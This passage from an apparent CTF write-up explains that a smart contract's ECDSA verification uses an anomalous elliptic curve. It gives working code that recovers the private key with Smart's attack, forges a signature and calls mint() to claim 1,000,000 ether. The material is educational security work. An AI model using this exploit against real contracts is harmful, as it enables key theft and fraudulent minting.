(x', y') = u_1 G + u_2 Q \]</p><li><p>Compute \( x' \mod n \) and check:</p> <p>\[ x' \equiv r \mod n \]</p> <p>If true, the signature is valid.</p></ol><h3 id=attack-1>Attack</h3><p>Lets get all the values and point details from the protocol.<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>Fallout :  0xf96C8C1685180b9551f86952992baAA220E7C91C
</span><span>Vault :  0x11e44e424A85203E1208097128B9B1e897C8A9A9
</span><span>Qx =  228372021298333142209829245091882548944496316312635232236
</span><span>Qy =  3693481507636668030082911526987394375826206080991036294396
</span><span>a =  479674765111403080798288599752794621357071126054239970719
</span><span>b =  1839890679886286542886449861618094502587090720247817035647
</span><span>gx =  741691539696267564005241324344676638704819822626281227364
</span><span>gy =  3102360199939373249439960210926161310269296148717758328237
</span><span>p =  4007911249843509079694969957202343357280666055654537667969
</span></code></pre><p>Enough equtions, now compare the current solidity implementation of the verification process with the above equations.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>validateSignature</span><span>(</span><span style=color:#0086b3>bytes32 </span><span>message, </span><span style=color:#0086b3>uint</span><span>[</span><span style=color:#0086b3>2</span><span>] </span><span style=color:#a71d5d;font-weight:700>memory </span><span>rs, </span><span style=color:#0086b3>uint</span><span>[</span><span style=color:#0086b3>2</span><span>] </span><span style=color:#a71d5d;font-weight:700>memory </span><span>Q) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>    </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>bool</span><span>)
</span><span>{
</span><span>    </span><span style=color:#969896;font-style:italic>// To disambiguate between public key solutions, include comment below.
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if</span><span>(rs[0] </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 || rs[0] >= p || rs[1] == 0) {</span><span style=color:#969896;font-style:italic>// || rs[1] > lowSmax)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span style=color:#62a35c>isOnCurve</span><span>(Q[0], Q[1])) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>    }
</span><span>    </span><span style=color:#0086b3>uint</span><span> x1;
</span><span>    </span><span style=color:#0086b3>uint</span><span> x2;
</span><span>    </span><span style=color:#0086b3>uint</span><span> y1;
</span><span>    </span><span style=color:#0086b3>uint</span><span> y2;
</span><span>    </span><span style=color:#0086b3>uint</span><span> sInv </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>inverseMod</span><span>(rs[1], p);
</span><span>    (x1, y1) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>multiplyScalar</span><span>(gx, gy, </span><span style=color:#a71d5d;font-weight:700>mulmod</span><span>(</span><span style=color:#0086b3>uint</span><span>(message), sInv, p));
</span><span>    (x2, y2) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>multiplyScalar</span><span>(Q[0], Q[1], </span><span style=color:#a71d5d;font-weight:700>mulmod</span><span>(rs[0], sInv, p));
</span><span>    </span><span style=color:#0086b3>uint</span><span>[3] memory P </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>addAndReturnProjectivePoint</span><span>(x1, y1, x2, y2);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(P[2] </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>    }
</span><span>    </span><span style=color:#0086b3>uint</span><span> Px </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>inverseMod</span><span>(P[2], p);
</span><span>    Px </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(P[0], </span><span style=color:#a71d5d;font-weight:700>mulmod</span><span>(Px, Px, p), p);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span> Px </span><span style=color:#a71d5d;font-weight:700>%</span><span> p </span><span style=color:#a71d5d;font-weight:700>==</span><span> rs[0];
</span><span>}
</span></code></pre><p>The <code>sInv</code> is computed using <code>mod n</code>. <code>u1(x1, y1)</code> and <code>u2(x1, y1)</code> are also computed over <code>mod n</code> and suprisingly we didn't got <code>n</code> value from the protocol. So, something is fishy...<p><code>n</code> is the order of the curve. We can compute this by doing the following.<p>\[ Ep = EllipticCurve(GF(p), [a,b]) \]<p>\[ n = Ep.order()\]<p>\[ n = 4007911249843509079694969957202343357280666055654537667969\]<p>Interesting, \[ p == n \]<p>These kind of ECC curves are called as <strong>Anomalous Curves</strong>. It is easy to solve the ECDLP in linear time when the underlying elliptic curve is anomalous, i.e. when the number of rational points on <code>Fp</code> is equal to the prime number <code>p</code>. There was a research paper named <a href=https://www.monnerat.info/publications/anomalous.pdf>Generating Anomalous Elliptic Curves</a> published on how to do this. This paper explained an attack called <strong>Smart</strong> to solve ECDLP of Anomalous Curves.<p>So, now with the <strong>Smart</strong> attack we can compute the Private key from the given values. So, once the we compute the Private Key we need to generate the <code>message</code> which we are going to sign and pass to the <code>mint</code> function.<p><code>bytes32 message = keccak256(abi.encode(player, 1_000_000 ether));</code><p>Now we need to sign the above message with the computed private key and pass the signature to <code>mint()</code> function. That's all.<p>Python script to perform <strong>Smart Attack</strong><div class=note-container><button class=note-toggle><div class=note-icon><p>fall.py</div></button><div class=note-content style=display:none><pre class=language-python data-lang=python style=color:#323232;background-color:#fff><code class=language-python data-lang=python><span style=color:#969896;font-style:italic># https://mslc.ctf.su/wp/polictf-2012-crypto-500/
</span><span style=color:#969896;font-style:italic># https://ctftime.org/writeup/29700
</span><span style=color:#969896;font-style:italic># https://giacomopope.com/hsctf-2019/#spooky-ecc
</span><span>
</span><span>p </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>4007911249843509079694969957202343357280666055654537667969
</span><span>q </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>2</span><span style=color:#a71d5d;font-weight:700>*</span><span>p </span><span style=color:#a71d5d;font-weight:700>+ </span><span style=color:#0086b3>1
</span><span>a </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>479674765111403080798288599752794621357071126054239970719 
</span><span>b </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>1839890679886286542886449861618094502587090720247817035647
</span><span>
</span><span>Ep </span><span style=color:#a71d5d;font-weight:700>= </span><span>EllipticCurve(GF(p), [a,b])
</span><span>G </span><span style=color:#a71d5d;font-weight:700>= </span><span>Ep(</span><span style=color:#0086b3>741691539696267564005241324344676638704819822626281227364</span><span>,</span><span style=color:#0086b3>3102360199939373249439960210926161310269296148717758328237</span><span>)
</span><span>Q </span><span style=color:#a71d5d;font-weight:700>= </span><span>Ep(</span><span style=color:#0086b3>228372021298333142209829245091882548944496316312635232236</span><span>,</span><span style=color:#0086b3>3693481507636668030082911526987394375826206080991036294396</span><span>)
</span><span>
</span><span>n </span><span style=color:#a71d5d;font-weight:700>= </span><span>Ep.order()
</span><span>Fn </span><span style=color:#a71d5d;font-weight:700>= </span><span>FiniteField(n)
</span><span>
</span><span>m </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>19666107331951626476415026567086342074650612991336538073686539593437448590271
</span><span>
</span><span style=color:#a71d5d;font-weight:700>def </span><span style=color:#323232;font-weight:700>SmartAttack</span><span>(P,Q,p):
</span><span>    E </span><span style=color:#a71d5d;font-weight:700>= </span><span>P.curve()
</span><span>    Eqp </span><span style=color:#a71d5d;font-weight:700>= </span><span>EllipticCurve(Qp(p, </span><span style=color:#0086b3>2</span><span>), [ ZZ(t) </span><span style=color:#a71d5d;font-weight:700>+ </span><span>randint(</span><span style=color:#0086b3>0</span><span>,p)</span><span style=color:#a71d5d;font-weight:700>*</span><span>p </span><span style=color:#a71d5d;font-weight:700>for </span><span>t </span><span style=color:#a71d5d;font-weight:700>in </span><span>E.a_invariants() ])
</span><span>
</span><span>    P_Qps </span><span style=color:#a71d5d;font-weight:700>= </span><span>Eqp.lift_x(ZZ(P.xy()[</span><span style=color:#0086b3>0</span><span>]), all</span><span style=color:#a71d5d;font-weight:700>=</span><span style=color:#0086b3>True</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>for </span><span>P_Qp </span><span style=color:#a71d5d;font-weight:700>in </span><span>P_Qps:
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>GF(p)(P_Qp.xy()[</span><span style=color:#0086b3>1</span><span>]) </span><span style=color:#a71d5d;font-weight:700>== </span><span>P.xy()[</span><span style=color:#0086b3>1</span><span>]:
</span><span>            </span><span style=color:#a71d5d;font-weight:700>break
</span><span>
</span><span>    Q_Qps </span><span style=color:#a71d5d;font-weight:700>= </span><span>Eqp.lift_x(ZZ(Q.xy()[</span><span style=color:#0086b3>0</span><span>]), all</span><span style=color:#a71d5d;font-weight:700>=</span><span style=color:#0086b3>True</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>for </span><span>Q_Qp </span><span style=color:#a71d5d;font-weight:700>in </span><span>Q_Qps:
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>GF(p)(Q_Qp.xy()[</span><span style=color:#0086b3>1</span><span>]) </span><span style=color:#a71d5d;font-weight:700>== </span><span>Q.xy()[</span><span style=color:#0086b3>1</span><span>]:
</span><span>            </span><span style=color:#a71d5d;font-weight:700>break
</span><span>
</span><span>    p_times_P </span><span style=color:#a71d5d;font-weight:700>= </span><span>p</span><span style=color:#a71d5d;font-weight:700>*</span><span>P_Qp
</span><span>    p_times_Q </span><span style=color:#a71d5d;font-weight:700>= </span><span>p</span><span style=color:#a71d5d;font-weight:700>*</span><span>Q_Qp
</span><span>
</span><span>    x_P,y_P </span><span style=color:#a71d5d;font-weight:700>= </span><span>p_times_P.xy()
</span><span>    x_Q,y_Q </span><span style=color:#a71d5d;font-weight:700>= </span><span>p_times_Q.xy()
</span><span>
</span><span>    phi_P </span><span style=color:#a71d5d;font-weight:700>= -</span><span>(x_P</span><span style=color:#a71d5d;font-weight:700>/</span><span>y_P)
</span><span>    phi_Q </span><span style=color:#a71d5d;font-weight:700>= -</span><span>(x_Q</span><span style=color:#a71d5d;font-weight:700>/</span><span>y_Q)
</span><span>    k </span><span style=color:#a71d5d;font-weight:700>= </span><span>phi_Q</span><span style=color:#a71d5d;font-weight:700>/</span><span>phi_P
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>ZZ(k)
</span><span>
</span><span style=color:#a71d5d;font-weight:700>def </span><span style=color:#323232;font-weight:700>ecdsa_sign</span><span>(d, m):
</span><span>  r </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0
</span><span>  s </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0
</span><span>  </span><span style=color:#a71d5d;font-weight:700>while </span><span>s </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>0</span><span>:
</span><span>    k </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>1
</span><span>    </span><span style=color:#a71d5d;font-weight:700>while </span><span>r </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>0</span><span>:
</span><span>      k </span><span style=color:#a71d5d;font-weight:700>= </span><span>randint(</span><span style=color:#0086b3>1</span><span>, n </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>1</span><span>)
</span><span>      Q </span><span style=color:#a71d5d;font-weight:700>= </span><span>k </span><span style=color:#a71d5d;font-weight:700>* </span><span>G
</span><span>      (x1, y1) </span><span style=color:#a71d5d;font-weight:700>= </span><span>Q.xy()
</span><span>      r </span><span style=color:#a71d5d;font-weight:700>= </span><span>Fn(x1)
</span><span>    e </span><span style=color:#a71d5d;font-weight:700>= </span><span>m
</span><span>    s </span><span style=color:#a71d5d;font-weight:700>= </span><span>Fn(k) </span><span style=color:#a71d5d;font-weight:700>^ </span><span>(</span><span style=color:#a71d5d;font-weight:700>-</span><span style=color:#0086b3>1</span><span>) </span><span style=color:#a71d5d;font-weight:700>* </span><span>(e </span><span style=color:#a71d5d;font-weight:700>+ </span><span>d </span><span style=color:#a71d5d;font-weight:700>* </span><span>r)
</span><span>  </span><span style=color:#a71d5d;font-weight:700>return </span><span>[r, s]
</span><span>
</span><span style=color:#a71d5d;font-weight:700>def </span><span style=color:#323232;font-weight:700>ecdsa_verify</span><span>(Q, m, r, s):
</span><span>  e </span><span style=color:#a71d5d;font-weight:700>= </span><span>m
</span><span>  w </span><span style=color:#a71d5d;font-weight:700>= </span><span>s </span><span style=color:#a71d5d;font-weight:700>^ </span><span>(</span><span style=color:#a71d5d;font-weight:700>-</span><span style=color:#0086b3>1</span><span>)
</span><span>  u1 </span><span style=color:#a71d5d;font-weight:700>= </span><span>(e </span><span style=color:#a71d5d;font-weight:700>* </span><span>w)
</span><span>  u2 </span><span style=color:#a71d5d;font-weight:700>= </span><span>(r </span><span style=color:#a71d5d;font-weight:700>* </span><span>w)
</span><span>  P1 </span><span style=color:#a71d5d;font-weight:700>= </span><span>Integer(u1) </span><span style=color:#a71d5d;font-weight:700>* </span><span>G
</span><span>  P2 </span><span style=color:#a71d5d;font-weight:700>= </span><span>Integer(u2) </span><span style=color:#a71d5d;font-weight:700>* </span><span>Q
</span><span>  X </span><span style=color:#a71d5d;font-weight:700>= </span><span>P1 </span><span style=color:#a71d5d;font-weight:700>+ </span><span>P2
</span><span>  (x, y) </span><span style=color:#a71d5d;font-weight:700>= </span><span>X.xy()
</span><span>  v </span><span style=color:#a71d5d;font-weight:700>= </span><span>Fn(x)
</span><span>  </span><span style=color:#a71d5d;font-weight:700>return </span><span>v </span><span style=color:#a71d5d;font-weight:700>== </span><span>r
</span><span>
</span><span>d </span><span style=color:#a71d5d;font-weight:700>= </span><span>SmartAttack(G,Q,p)
</span><span>
</span><span>[r, s] </span><span style=color:#a71d5d;font-weight:700>= </span><span>ecdsa_sign(d, m)
</span><span>result </span><span style=color:#a71d5d;font-weight:700>= </span><span>ecdsa_verify(Q, m, r, s)
</span><span>
</span><span style=color:#62a35c>print </span><span>(</span><span style=color:#a71d5d;font-weight:700>f</span><span style=color:#183691>"Message: </span><span>{m}</span><span style=color:#183691>"</span><span>)
</span><span style=color:#62a35c>print </span><span>(</span><span style=color:#a71d5d;font-weight:700>f</span><span style=color:#183691>"Public Key: </span><span>{Q.xy()}</span><span style=color:#183691>"</span><span>)
</span><span style=color:#62a35c>print </span><span>(</span><span style=color:#a71d5d;font-weight:700>f</span><span style=color:#183691>"Private Key: </span><span>{d}</span><span style=color:#183691>"</span><span>)
</span><span>
</span><span style=color:#62a35c>print </span><span>(</span><span style=color:#183691>"=== Signature ==="</span><span>)
</span><span style=color:#62a35c>print </span><span>(</span><span style=color:#a71d5d;font-weight:700>f</span><span style=color:#183691>" r = </span><span>{r}</span><span style=color:#183691>"</span><span>)
</span><span style=color:#62a35c>print </span><span>(</span><span style=color:#a71d5d;font-weight:700>f</span><span style=color:#183691>" s = </span><span>{s}</span><span style=color:#183691>"</span><span>)
</span><span style=color:#62a35c>print </span><span>(</span><span style=color:#a71d5d;font-weight:700>f</span><span style=color:#183691>"Verification: </span><span>{result}</span><span style=color:#183691>"</span><span>)
</span><span>
</span><span style=color:#969896;font-style:italic># Message: 19666107331951626476415026567086342074650612991336538073686539593437448590271
</span><span style=color:#969896;font-style:italic># Public Key: (228372021298333142209829245091882548944496316312635232236, 3693481507636668030082911526987394375826206080991036294396)
</span><span style=color:#969896;font-style:italic># Private Key: 2590225047465443722024386469461634294729219346156883417670
</span><span style=color:#969896;font-style:italic># === Signature ===
</span><span style=color:#969896;font-style:italic>#  r = 2195097151127120065579326181785367043581509779126357541128
</span><span style=color:#969896;font-style:italic>#  s = 928540552076520879873320608471470817377985074596666122262
</span><span style=color:#969896;font-style:italic># Verification: True
</span></code></pre></div></div><p>Solidity script to call <code>mint()</code>.<div class=note-container><button class=note-toggle><div class=note-icon><p>Fallout.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../src/Fallout.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>FalloutSolve </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
</span><span>    Fallout </span><span style=color:#a71d5d;font-weight:700>public </span><span>fallout </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Fallout</span><span>(</span><span style=color:#0086b3>0xf96C8C1685180b9551f86952992baAA220E7C91C</span><span>);
</span><span>    Vault </span><span style=color:#a71d5d;font-weight:700>public </span><span>vault </span><span style=color:#a71d5d;font-weight:700>=</span><span> fallout.</span><span style=color:#62a35c>vault</span><span>();
</span><span>    </span><span style=color:#0086b3>address</span><span> player </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>envAddress</span><span>(</span><span style=color:#183691>"PLAYER"</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(vm.</span><span style=color:#62a35c>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Fallout : "</span><span>, </span><span style=color:#0086b3>address</span><span>(fallout));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Vault : "</span><span>, </span><span style=color:#0086b3>address</span><span>(vault));
</span><span>        </span><span style=color:#0086b3>uint256</span><span> qx </span><span style=color:#a71d5d;font-weight:700>=</span><span> fallout.</span><span style=color:#62a35c>Qx</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span> qy </span><span style=color:#a71d5d;font-weight:700>=</span><span> fallout.</span><span style=color:#62a35c>Qy</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span>  a </span><span style=color:#a71d5d;font-weight:700>=</span><span> vault.</span><span style=color:#62a35c>a</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span>  b </span><span style=color:#a71d5d;font-weight:700>=</span><span> vault.</span><span style=color:#62a35c>b</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span>  gx </span><span style=color:#a71d5d;font-weight:700>=</span><span> vault.</span><span style=color:#62a35c>gx</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span>  gy </span><span style=color:#a71d5d;font-weight:700>=</span><span> vault.</span><span style=color:#62a35c>gy</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span>  p </span><span style=color:#a71d5d;font-weight:700>=</span><span> vault.</span><span style=color:#62a35c>p</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span> n </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>4007911249843509079694969957202343357280666055654537667969</span><span>; </span><span style=color:#969896;font-style:italic>// n = Ep.order()
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Qx = "</span><span>, qx);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Qy = "</span><span>, qy);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"a = "</span><span>, a);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"b = "</span><span>, b);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"gx = "</span><span>, gx);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"gy = "</span><span>, gy);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"p = "</span><span>, p);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"n = "</span><span>, n);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved() : "</span><span>, fallout.</span><span style=color:#62a35c>isSolved</span><span>());
</span><span>        </span><span style=color:#0086b3>bytes32</span><span> hash </span><span style=color:#a71d5d;font-weight:700>= keccak256</span><span>(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encode</span><span>(player, </span><span style=color:#0086b3>1_000_000 ether</span><span>));
</span><span>        console.</span><span style=color:#62a35c>logBytes32</span><span>(hash);
</span><span>        </span><span style=color:#0086b3>uint256</span><span>[2] memory rs </span><span style=color:#a71d5d;font-weight:700>= </span><span>[uint256(2195097151127120065579326181785367043581509779126357541128), 928540552076520879873320608471470817377985074596666122262];
</span><span>        fallout.</span><span style=color:#62a35c>mint</span><span>(player, </span><span style=color:#0086b3>1_000_000 ether</span><span>, rs);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved() : "</span><span>, fallout.</span><span style=color:#62a35c>isSolved</span><span>());   
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=chef>Chef</h1><p>I learned Huff programming just to solve this challenge. This challenge deserves a dedicated blog, read it here : <a href=https://themj0ln1r.github.io/posts/learn-huff-with-ctf>Learn Huff by solving a CTF challenge</a><hr><p>Kudos to you for sticking with me till the end and hope you've learned something from this.<h2 id=references>References</h2><ol><li><a href=https://blog.trailofbits.com/2018/09/05/contract-upgrade-anti-patterns/>Anti Proxy Patterns</a><li><a href=https://www.cyfrin.io/blog/price-oracle-manipulation-attacks-with-examples>Oracle Manipulation</a><li><a href=https://mixbytes.io/blog/uniswap-v3-ticks-dive-into-concentrated-liquidity>Uniswap V3 Concentrated Liquidity</a><li><a href=https://rdi.berkeley.edu/berkeley-defi/assets/material/COMPRESSED%20Oracle%20Lecture%E2%80%94DeFi%20course.pdf>Oracles</a><li><a href=https://rdi.berkeley.edu/berkeley-defi/assets/material/Lecture%207%20Introduction%20Slides.pdf>Stable Coins</a><li><a href=https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity>CurveStableSwapNG Metapool Docs</a><li><a href=https://cryptobook.nakov.com/asymmetric-key-ciphers/elliptic-curve-cryptography-ecc>Elliptic Curve For Developers</a><li><a href=https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/>ECDSA Handle with care</a><li><a href=https://www.monnerat.info/publications/anomalous.pdf>Generating Anomalous Elliptic Curves</a></ol></section></article></main></div>